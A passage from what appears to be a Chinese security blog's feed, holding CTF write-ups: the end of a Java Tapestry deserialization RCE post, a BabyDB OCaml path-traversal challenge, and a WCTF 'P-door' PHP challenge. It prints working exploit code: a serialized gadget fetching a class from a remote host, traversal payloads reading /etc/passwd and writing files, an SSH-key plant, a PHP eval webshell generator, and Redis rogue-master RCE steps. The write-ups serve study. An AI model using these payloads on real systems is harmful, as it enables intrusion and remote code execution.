class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Object exp = getExploit(<span class="string">"http://240.240.240.240:1234/:Exploit"</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ClientDataEncoder en = <span class="keyword">new</span> ClientDataEncoderImpl(<span class="keyword">null</span>, <span class="string">"TOP_SECRET_PASSPHRASE_YOU_WILL_NEVER_KNOW:)"</span>, <span class="keyword">null</span>,</span><br><span class="line">                <span class="string">"does not matter"</span>, <span class="keyword">null</span>);</span><br><span class="line">            ClientDataSink sink = en.createSink();</span><br><span class="line">            ObjectOutputStream s = sink.getObjectOutputStream();</span><br><span class="line">            s.writeUTF(<span class="string">"1234"</span>);</span><br><span class="line">            s.writeBoolean(<span class="keyword">true</span>);</span><br><span class="line">            s.writeObject(exp);</span><br><span class="line">            s.close();</span><br><span class="line">            String out = sink.getClientData();</span><br><span class="line">            System.out.println(out);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException i) &#123;</span><br><span class="line">            i.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span> </span>&#123; </span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">Exploit</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    <span class="keyword">try</span> &#123; </span><br><span class="line">      Runtime.getRuntime().exec(<span class="keyword">new</span> String[]&#123;<span class="string">"bash"</span>, <span class="string">"-c"</span>,</span><br><span class="line">        <span class="string">"sleep 5"</span></span><br><span class="line">      &#125;).waitFor();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123; </span><br><span class="line">    &#125; </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="BabyDB"><a href="#BabyDB" class="headerlink" title="BabyDB"></a>BabyDB</h2><p>题目使用ocaml-cohttp完成了一个web服务，使用文件系统作为数据库，实现了注册，登录，存储，加载等操作。<br>我们观察到其功能：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">match handler with</span><br><span class="line">    | &quot;register&quot; -&gt; register req body args</span><br><span class="line">    | &quot;login&quot; -&gt; test_login req body args</span><br><span class="line">    | &quot;load&quot; -&gt; default_load req body args </span><br><span class="line">    | &quot;store&quot; -&gt; default_store req body args </span><br><span class="line">    | &quot;static&quot; -&gt; static req body args</span><br><span class="line">    | &quot;batch&quot; -&gt; batch req body args</span><br><span class="line">    | _ -&gt; unknown</span><br></pre></td></tr></table></figure></p><p>我们首先进行用户注册：<br><img src="/images/2019-07-16-21-37-17.png" alt=""><br>再进行登录,并尝试文件读取：<br><img src="/images/2019-07-16-21-39-54.png" alt=""><br>发现error，我们查看原因：<br><img src="/images/2019-07-16-21-40-16.png" alt=""><br>由于目录不存在而导致我们目录穿越失败，不能进行文件读取。而这串md5和相关路径来自于以下代码：<br><img src="/images/2019-07-16-21-28-31.png" alt=""><br><img src="/images/2019-07-16-21-29-55.png" alt=""><br>那么很自然想到，需要让用户名为空，得到的md5自然为空，那么就可以进行目录上跳。<br>这里我们观察到login：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">| &quot;login&quot;::args::body::others -&gt; </span><br><span class="line">    let out = match is_default with</span><br><span class="line">    | true -&gt; real_login false (whoami sess) cont req body args</span><br><span class="line">    | false -&gt; real_login true (whoami sess) cont req body args</span><br><span class="line">    in</span><br><span class="line">    out</span><br></pre></td></tr></table></figure></p><p>跟进whoami，发现其为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">let whoami = fun _ -&gt; SessionState.get</span><br></pre></td></tr></table></figure></p><p>这里可以利用一个trick，使用户名为空，即第一次随意用用户名登录，第二次紧接着用空用户登录，即可构造用户名为空。<br>任意文件读取:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login?sky?:login??:load?../../../../../../etc/passwd?sky</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-07-16-21-44-27.png" alt=""><br><img src="/images/2019-07-16-21-44-35.png" alt=""><br>但是受制于load中的readfile:<br><img src="/images/2019-07-16-21-17-06.png" alt=""><br><img src="/images/2019-07-16-21-12-40.png" alt=""><br>我们只能读取文件第一行的内容，但flag文件第一行内容并不是flag。但我们注意到还可以使用store进行任意文件写入。<br>这里store的bypass和load一致，不再分析，直接给出exp：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login?user?user:login??:store?../../../../../../tmp/test_file?test_content</span><br></pre></td></tr></table></figure></p><p>那么这里应该可以想到写入ssh key，从而达成无需输入密码即可连入的目的。那么即可连入题目server，获取flag。</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>本篇文章结束了之前留下的坑，其实java和ocaml对我来说，都是接触较少的语言，希望以后能有更多机会挑战自己，走出舒适圈XD。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;这篇文章接之前留下的坑，主要分析了java Tapestry的一个从文件读取到反序列化RCE的一个漏洞和ocaml的一个小trick。&lt;/p
      
    
    </summary>
    
      <category term="web" scheme="http://skysec.top/categories/web/"/>
    
    
      <category term="web" scheme="http://skysec.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>2019 WCTF &amp; P-door</title>
    <link href="http://skysec.top/2019/07/09/2019-WCTF-P-door/"/>
    <id>http://skysec.top/2019/07/09/2019-WCTF-P-door/</id>
    <published>2019-07-09T07:11:11.000Z</published>
    <updated>2019-07-10T13:52:21.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>2019 WCTF看到有一道web题目开源了：<a href="https://github.com/paul-axe/ctf.git。" target="_blank" rel="noopener">https://github.com/paul-axe/ctf.git。</a><br>同时看到wupco的题解：<a href="https://hackmd.io/@ZzDmROodQUynQsF9je3Q5Q/HkzsDzRxr。" target="_blank" rel="noopener">https://hackmd.io/@ZzDmROodQUynQsF9je3Q5Q/HkzsDzRxr。</a><br>感觉这道题非常有趣，于是在此分析一下。</p><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>拿到题目后，粗略的看了一下几个功能：<br>1.注册<br>2.登录<br>3.写文章<br><img src="/images/2019-07-09-15-16-28.png" alt=""><br>同时注意到cookie：<br><img src="/images/2019-07-09-15-16-48.png" alt=""><br><img src="/images/2019-07-09-15-16-55.png" alt=""><br>看到有序列化的值，那么猜测可能有源码泄露：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.106:10003/.git/</span><br></pre></td></tr></table></figure></p><p>扫描后发现确实存在文件泄露。</p><h2 id="目录穿越"><a href="#目录穿越" class="headerlink" title="目录穿越"></a>目录穿越</h2><p>代码量非常少，但挑战不小。我们关注到主要有3个大类：User、Cache、Page。<br>同时关注到题目使用了redis作为数据库：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$redis = <span class="keyword">new</span> Redis();</span><br><span class="line">$redis-&gt;connect(<span class="string">"db"</span>, <span class="number">6379</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Cant connect to database"</span>);</span><br></pre></td></tr></table></figure></p><p>那么猜测题目不是要getshell就是ssrf。<br>如果要进行getshell，那么或许可以利用写文章的功能。那么现在的审计重点则来到写文件部分：<br>我们关注到Page类里的publish方法:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">publish</span><span class="params">($filename)</span> </span>&#123;</span><br><span class="line">    $user = User::getInstance();</span><br><span class="line">    $ext = substr(strstr($filename, <span class="string">"."</span>), <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    $path = $user-&gt;getCacheDir() . <span class="string">"/"</span> . microtime(<span class="keyword">true</span>) . <span class="string">"."</span> . $ext;</span><br><span class="line">    $user-&gt;checkWritePermissions();</span><br><span class="line">    Cache::writeToFile($path, <span class="keyword">$this</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>我们关注到路径：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ext = substr(strstr($filename, <span class="string">"."</span>), <span class="number">1</span>);</span><br></pre></td></tr></table></figure></p><p>首先后缀会取第一个点后的部分，那么可以构造出路径穿越，例如：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$filename = <span class="string">'./../../../../../var/www/html/sky.php'</span>;</span><br></pre></td></tr></table></figure></p><p>所以我们可以利用这一点进行任意目录写，我们跟进一下传参方式：<br>首先看index.php:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$controller = <span class="keyword">new</span> MainController();</span><br><span class="line">$method = <span class="string">"do"</span>.$_GET[<span class="string">"m"</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (method_exists($controller, $method))&#123;</span><br><span class="line">    $controller-&gt;$method();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $controller-&gt;doIndex();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>发现我们可以触发以do开头的方法，那么查看一下相关调用publish的方法：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">doPublish</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checkAuth();</span><br><span class="line">        $page = unserialize($_COOKIE[<span class="string">"draft"</span>]);</span><br><span class="line">        $fname = $_POST[<span class="string">"fname"</span>];</span><br><span class="line">        $page-&gt;publish($fname);</span><br><span class="line">        setcookie(<span class="string">"draft"</span>, <span class="keyword">null</span>, <span class="number">-1</span>);</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Your blog post will be published after a while (never)&lt;br&gt;&lt;a href=/&gt;Back&lt;/a&gt;"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>发现$page会调用publish方法，传参使用POST参数fname。<br>那么我们可以构造fname参数为:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./../../../../../var/www/html/sky.php</span><br></pre></td></tr></table></figure></p><p>我们继续往下，可以看到：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cache::writeToFile($path, <span class="keyword">$this</span>);</span><br></pre></td></tr></table></figure></p><p>跟进writeToFile():<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cache</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">writeToFile</span><span class="params">($path, $content)</span> </span>&#123;</span><br><span class="line">        $info = pathinfo($path);</span><br><span class="line">        <span class="keyword">if</span> (!is_dir($info[<span class="string">"dirname"</span>]))</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="keyword">Exception</span>(<span class="string">"Directory doesn't exists"</span>);</span><br><span class="line">        <span class="keyword">if</span> (is_file($path))</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="keyword">Exception</span>(<span class="string">"File already exists"</span>);</span><br><span class="line">        file_put_contents($path, $content);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>我们发现这里会进行check：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!is_dir($info[<span class="string">"dirname"</span>]))</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="keyword">Exception</span>(<span class="string">"Directory doesn't exists"</span>);</span><br></pre></td></tr></table></figure></p><p>而我们的路径为：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$path = $user-&gt;getCacheDir() . <span class="string">"/"</span> . microtime(<span class="keyword">true</span>) . <span class="string">"."</span> . $ext;</span><br></pre></td></tr></table></figure></p><p>这里显然microtime(true)文件夹不存在。</p><h2 id="任意文件夹创建"><a href="#任意文件夹创建" class="headerlink" title="任意文件夹创建"></a>任意文件夹创建</h2><p>还是刚才那句代码:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$path = $user-&gt;getCacheDir() . <span class="string">"/"</span> . microtime(<span class="keyword">true</span>) . <span class="string">"."</span> . $ext;</span><br></pre></td></tr></table></figure></p><p>我们跟进getCacheDir():<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getCacheDir</span><span class="params">()</span>: <span class="title">string</span> </span>&#123;</span><br><span class="line">        $dir_path = <span class="keyword">self</span>::CACHE_PATH . <span class="keyword">$this</span>-&gt;name;</span><br><span class="line">        <span class="keyword">if</span> (!is_dir($dir_path))&#123;</span><br><span class="line">            mkdir($dir_path);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $dir_path;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>发现其中会进行mkdir，但这一步在校验写权限之前：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$user-&gt;checkWritePermissions();</span><br></pre></td></tr></table></figure></p><p>故此如果我们可以控制：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$dir_path = <span class="keyword">self</span>::CACHE_PATH . <span class="keyword">$this</span>-&gt;name;</span><br></pre></td></tr></table></figure></p><p>那么即可创建任意目录。<br>那么这里就需要我们对microtime(true)进行预估：<br><img src="/images/2019-07-09-15-58-31.png" alt=""><br>我们可以设置一个提前时间量进行批量文件夹创建，然后后续可以进行爆破publish，直到找到文件夹。<br>达到任意文件写的目的。</p><h2 id="控制文件内容难题"><a href="#控制文件内容难题" class="headerlink" title="控制文件内容难题"></a>控制文件内容难题</h2><p>在可任意文件写后，我们需要控制文件的内容，我们审计相关代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cache::writeToFile($path, <span class="keyword">$this</span>);</span><br></pre></td></tr></table></figure></p><p>注意到$this，我们跟进writeToFile()：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">writeToFile</span><span class="params">($path, $content)</span> </span>&#123;</span><br><span class="line">    $info = pathinfo($path);</span><br><span class="line">    <span class="keyword">if</span> (!is_dir($info[<span class="string">"dirname"</span>]))</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="keyword">Exception</span>(<span class="string">"Directory doesn't exists"</span>);</span><br><span class="line">    <span class="keyword">if</span> (is_file($path))</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="keyword">Exception</span>(<span class="string">"File already exists"</span>);</span><br><span class="line">    file_put_contents($path, $content);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>发现关键代码:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_put_contents($path, $content);</span><br></pre></td></tr></table></figure></p><p>此处会触发魔法方法__toString()：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span>: <span class="title">string</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;render();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>进而触发render():<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">render</span><span class="params">()</span>: <span class="title">string</span> </span>&#123;</span><br><span class="line">        $user = User::getInstance();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!array_key_exists(<span class="keyword">$this</span>-&gt;template, <span class="keyword">self</span>::TEMPLATES))</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Invalid template"</span>);</span><br><span class="line"></span><br><span class="line">        $tpl = <span class="keyword">self</span>::TEMPLATES[<span class="keyword">$this</span>-&gt;template];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;view = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;view[<span class="string">"content"</span>] = file_get_contents($tpl);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;vars[<span class="string">"user"</span>]  = $user-&gt;name;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;vars[<span class="string">"text"</span>]  = <span class="keyword">$this</span>-&gt;text.<span class="string">"\n"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;vars[<span class="string">"rendered"</span>] = microtime(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        $content = <span class="keyword">$this</span>-&gt;renderVars();</span><br><span class="line">        $header = <span class="keyword">$this</span>-&gt;getHeader();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $header.$content;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>此处会对content进行过滤：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$content = <span class="keyword">$this</span>-&gt;renderVars();</span><br></pre></td></tr></table></figure></p><p>我们跟进renderVars()：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">renderVars</span><span class="params">()</span>: <span class="title">string</span> </span>&#123;</span><br><span class="line">        $content = <span class="keyword">$this</span>-&gt;view[<span class="string">"content"</span>];</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;vars <span class="keyword">as</span> $k=&gt;$v)&#123;</span><br><span class="line">            $v = htmlspecialchars($v);</span><br><span class="line">            $content = str_replace(<span class="string">"@@$k@@"</span>, $v, $content);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $content;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>我们发现这里会对content进行过滤：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$v = htmlspecialchars($v);</span><br></pre></td></tr></table></figure></p><p>那么现在的难点在于，我们无法构造出php tag来写入文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php &gt; echo htmlspecialchars(&quot;&lt;?php phpinfo();?&gt;&quot;);</span><br><span class="line">&amp;lt;?php phpinfo();?&amp;gt;</span><br></pre></td></tr></table></figure></p><h2 id="巧妙php-tag构造"><a href="#巧妙php-tag构造" class="headerlink" title="巧妙php tag构造"></a>巧妙php tag构造</h2><p>我们注意到关键代码:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;view = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">$this</span>-&gt;view[<span class="string">"content"</span>] = file_get_contents($tpl);</span><br><span class="line"><span class="keyword">$this</span>-&gt;vars[<span class="string">"user"</span>]  = $user-&gt;name;</span><br><span class="line"><span class="keyword">$this</span>-&gt;vars[<span class="string">"text"</span>]  = <span class="keyword">$this</span>-&gt;text.<span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">$this</span>-&gt;vars[<span class="string">"rendered"</span>] = microtime(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">$content = <span class="keyword">$this</span>-&gt;renderVars();</span><br><span class="line">$header = <span class="keyword">$this</span>-&gt;getHeader();</span><br></pre></td></tr></table></figure></p><p>并且在过滤之前，有赋值操作：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$content = <span class="keyword">$this</span>-&gt;view[<span class="string">"content"</span>];</span><br></pre></td></tr></table></figure></p><p>如果我们能在赋值之前控制$this-&gt;view，将其变成字符串而非数组，那么则可以绕过过滤：<br><img src="/images/2019-07-09-16-51-07.png" alt=""><br>那么这里就要用到2017 GCTF中的一个方法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://skysec.top/2017/06/20/GCTF%E7%9A%84%E4%B8%80%E9%81%93php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE/</span><br></pre></td></tr></table></figure></p><p>我们可以利用<code>&amp;</code>，例如：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;vars[<span class="string">"text"</span>]  = &amp;<span class="keyword">$this</span>-&gt;view;</span><br></pre></td></tr></table></figure></p><p>而此时我们只要改变$text的值，即可达到更改$this-&gt;view的目的，而我们发现$text并没有过滤，故此，我们可以构造：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$text=<span class="string">'&lt;?php'</span>;</span><br></pre></td></tr></table></figure></p><p>这样$view就会变成字符串，而非数组，这样便达成了我们上图bypass过滤的目的。<br>那么我们如何构造出可用的exp呢？仅仅1个<code>&lt;</code>是不够的，并且此处我们注意到file_put_contents不是追加数据而是覆盖。<br>所以我们的exp必须一次到位。那么这里就要看到最后的return：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> $header.$content;</span><br></pre></td></tr></table></figure></p><p>假如$content依然为对象，那么就会继续触发_toString()，这样一来我们就可以一个字符一个字符进行拼接，直到凑出exp，附上lcbc的构造exp：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$PAYLOAD = <span class="string">"&lt;?php eval(\$_REQUEST[1]);"</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gen_payload</span><span class="params">($payload)</span></span>&#123;</span><br><span class="line">    $expl = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ($i=<span class="number">0</span>; $i&lt;strlen($payload); $i++)&#123;</span><br><span class="line">        $p = <span class="keyword">new</span> Page(<span class="string">"main"</span>);</span><br><span class="line">        $p-&gt;text= $payload[$i];</span><br><span class="line">        $p-&gt;vars[<span class="string">"text"</span>] = &amp;$p-&gt;view;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!$expl)</span><br><span class="line">            $expl = $p;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            $p-&gt;header = $expl;</span><br><span class="line">            $expl = $p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> serialize($expl);</span><br><span class="line">&#125;</span><br><span class="line">gen_payload($PAYLOAD);</span><br></pre></td></tr></table></figure></p><p>非常巧妙的拼接出了payload：<br><img src="/images/2019-07-10-09-59-03.png" alt=""><br>在最后闭合<code>?&gt;</code>的时候，也用了一个技巧，可以使用__halt_compiler()进行编译器停止：<br><img src="/images/2019-07-10-21-52-07.png" alt=""><br><img src="/images/2019-07-10-21-51-50.png" alt=""><br>即可成功完成构造。</p><h2 id="redis"><a href="#redis" class="headerlink" title="redis"></a>redis</h2><p>这里用到了一个新的知识点，并且之前的未授权访问写shell，而是主从模式。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf</span><br></pre></td></tr></table></figure></p><p>我们简单测试一下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ redis-cli</span><br><span class="line">127.0.0.1:6379&gt; slaveof 127.0.0.1 6379</span><br><span class="line">OK</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-07-10-16-26-47.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; slaveof no one</span><br><span class="line">OK</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-07-10-16-27-51.png" alt=""><br>需要注意的一点，slave只能进行read:<br><img src="/images/2019-07-10-19-15-28.png" alt=""><br>我们来模拟一下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">假设题目redis服务在192.168.1.106:10004</span><br><span class="line">我们的公网ip为192.168.1.185</span><br></pre></td></tr></table></figure></p><p>使用脚本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/n0b0dyCN/redis-rogue-server</span><br></pre></td></tr></table></figure></p><p>在模拟公网ip为192.168.1.185端模拟一个redis server，启动时加载恶意so文件，然后让目标192.168.1.106:10004成为该server的slave，利用FULLRESYNC，可以进行RCE：<br><img 